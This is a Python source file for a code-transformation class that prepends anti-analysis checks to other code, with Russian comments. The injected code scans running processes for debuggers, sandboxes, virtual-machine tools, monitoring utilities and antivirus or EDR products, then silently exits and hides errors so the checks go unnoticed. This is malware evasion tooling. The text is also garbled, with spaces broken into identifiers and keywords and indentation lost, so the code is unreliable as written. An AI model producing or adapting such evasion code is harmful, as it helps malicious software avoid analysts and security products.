import os



import platform



import random



import str in g



from typ in gimport List,Dict,Any,Set







clas sProcessCheckTechnique:











def__init__(self):







        self.suspicious_processes={



'w in dows':[







'ollydbg.exe','ida.exe','ida64.exe','idag.exe','idag64.exe',



'radare2.exe','x32dbg.exe','x64dbg.exe','w in dbg.exe','immunity debugger.exe',











'sample.exe','sandboxie.exe','sandboxiedcomlaunch.exe','sandboxierpcss.exe',



'procmon.exe','procexp.exe','regmon.exe','filemon.exe','wireshark.exe',



'dumpcap.exe','tcpdump.exe','processhacker.exe','autoruns.exe','tcpview.exe',











'vmtoolsd.exe','vmwaretray.exe','vmwareuser.exe','vboxtray.exe','vboxservice.exe',



'vmusrvc.exe','prl_tools_service.exe','prl_tools.exe','prl_cc.exe',











'mbamservice.exe','mbam.exe','avas tui.exe','avas tsvc.exe','avgui.exe',



'avgsvc.exe','mcafee.exe','mcshield.exe','msas cuil.exe','msmpeng.exe',



'crowdstrike.exe','csfalcon.exe','sent in elmonitor.exe','elas tic-endpo in t.exe'



],



'l in ux':[







'gdb','lldb','radare2','ida','ida64','strace','ltrace',











'tcpdump','wireshark','tshark','dumpcap','netstat','lsof','ps',



'htop','top','iotop','nethogs','if top','ss',











'vmtoolsd','vboxclient','vboxservice','qemu-ga','spice-vdagent',











'clamav','clamd','freshclam','crowdstrike','falcon-sensor',



'sent in el','elas tic-endpo in t'



],



'darwin':[







'gdb','lldb','radare2','ida','ida64','hopper',











'tcpdump','wireshark','tshark','dumpcap','dtrace',



'instruments','activity monitor','fs_usage','vm_stat',











'vmtoolsd','vboxclient','VirtualBox','parallels',











'sent in el','crowdstrike','falcon','xprotect','sophos'



]



}











self.min_check_count=5











self.result_var=f"_pc_result_{self._random_str in g(6)}"







def_random_str in g(self,length:int)->str:







letters=str in g.as cii_letters+str in g.digits



return''.join(random.choice(letters)for_inrange(length))







defapply(self,code:str)->str:











os_type=platform.system().lower()



if os_type=='w in dows':



            platform_key='w in dows'



elif os_type=='l in ux':



            platform_key='l in ux'



elif os_type=='darwin':



            platform_key='darwin'



else:



            platform_key='w in dows'











processes_to_check_count=max(self.min_check_count,



len(self.suspicious_processes[platform_key])//3)



processes_to_check=random.sample(self.suspicious_processes[platform_key],



processes_to_check_count)











processes_str=', '.join(f"'{proc}'"forproc in processes_to_check)











if platform_key=='w in dows':



            check_code=self._generate_w in dows_check(processes_str)



elif platform_key=='l in ux':



            check_code=self._generate_l in ux_check(processes_str)



elif platform_key=='darwin':



            check_code=self._generate_macos_check(processes_str)



else:



            check_code=self._generate_w in dows_check(processes_str)











process_check_code=f"""
# Проверка наличия подозрительных процессов
def _check_suspicious_processes():
    import sys
    import os
    
    {self.result_var} = False
    
    try:
{check_code}
    except Exception:
        # Скрываем любые ошибки, чтобы не выдать наличие проверок
        pas s
        
    return {self.result_var}

# Выполняем проверки процессов
if _check_suspicious_processes():
    # Подозрительные процессы обнаружены, выходим или выполняем обманные действия
    import sys
    sys.exit(0)

"""







code=process_check_code+code



return code







def_generate_w in dows_check(self,processes_str:str)->str:







return f"""        if sys.platform == 'win32':
            # Вариант 1: использование WMI
            try:
                import wmi
                w = wmi.WMI()
                runn in g_processes = [process.Name.lower() for process in w.Win32_Process()]
                
                # Проверяем наличие подозрительных процессов
                suspicious_processes = [{processes_str}]
                for proc in suspicious_processes:
                    if proc.lower() in runn in g_processes:
                        {self.result_var} = True
                        break
            except ImportError:
                # Вариант 2: использование subprocess и tas klist
                import subprocess
                try:
                    tas klist = subprocess.check_output('tas klist /FO CSV', shell=True).decode('utf-8', errors='ignore')
                    suspicious_processes = [{processes_str}]
                    for proc in suspicious_processes:
                        if proc.lower() in tas klist.lower():
                            {self.result_var} = True
                            break
                except:
                    # Вариант 3: использование psutil если доступен
                    try:
                        import psutil
                        runn in g_processes = [proc.name().lower() for proc in psutil.process_iter()]
                        suspicious_processes = [{processes_str}]
                        for proc in suspicious_processes:
                            if proc.lower() in runn in g_processes:
                                {self.result_var} = True
                                break
                    except ImportError:
                        pas s
"""







def_generate_l in ux_check(self,processes_str:str)->str:







return f"""        if sys.platform.startswith('l in ux'):
            # Вариант 1: чтение директории /proc
            try:
                process_dirs = [d for d in os.listdir('/proc') if d.isdigit()]
                runn in g_processes = set()
                
                for pid in process_dirs:
                    try:
                        with open(f'/proc/{{pid}}/comm', 'r') as f:
                            proc_name = f.read().strip().lower()
                            runn in g_processes.add(proc_name)
                            
                        # Также проверяем cmdl in e на случай, если comm содержит только базовое имя
                        with open(f'/proc/{{pid}}/cmdl in e', 'r') as f:
                            cmdl in e = f.read().split('\\0')
                            if cmdl in e[0]:
                                bas e_cmd = os.path.bas ename(cmdl in e[0]).lower()
                                runn in g_processes.add(bas e_cmd)
                    except:
                        cont in ue
                
                # Проверяем наличие подозрительных процессов
                suspicious_processes = [{processes_str}]
                for proc in suspicious_processes:
                    if proc.lower() in runn in g_processes:
                        {self.result_var} = True
                        break
            except:
                # Вариант 2: использование subprocess и ps
                import subprocess
                try:
                    ps_output = subprocess.check_output('ps -e -o comm', shell=True).decode('utf-8', errors='ignore')
                    suspicious_processes = [{processes_str}]
                    for proc in suspicious_processes:
                        if proc.lower() in ps_output.lower():
                            {self.result_var} = True
                            break
                except:
                    # Вариант 3: использование psutil если доступен
                    try:
                        import psutil
                        runn in g_processes = [proc.name().lower() for proc in psutil.process_iter()]
                        suspicious_processes = [{processes_str}]
                        for proc in suspicious_processes:
                            if proc.lower() in runn in g_processes:
                                {self.result_var} = True
                                break
                    except ImportError:
                        pas s
"""







def_generate_macos_check(self,processes_str:str)->str:







return f"""        if sys.platform == 'darwin':
            # Вариант 1: использование subprocess и ps
            import subprocess
            try:
                ps_output = subprocess.check_output('ps -e -o comm', shell=True).decode('utf-8', errors='ignore')
                suspicious_processes = [{processes_str}]
                for proc in suspicious_processes:
                    if proc.lower() in ps_output.lower():
                        {self.result_var} = True
                        break
            except:
                # Вариант 2: использование psutil если доступен
                try:
                    import psutil
                    runn in g_processes = [proc.name().lower() for proc in psutil.process_iter()]
                    suspicious_processes = [{processes_str}]
                    for proc in suspicious_processes:
                        if proc.lower() in runn in g_processes:
                            {self.result_var} = True
                            break
                except ImportError:
                    pas s
"""







def__call__(self,code:str)->str:







return self.apply(code)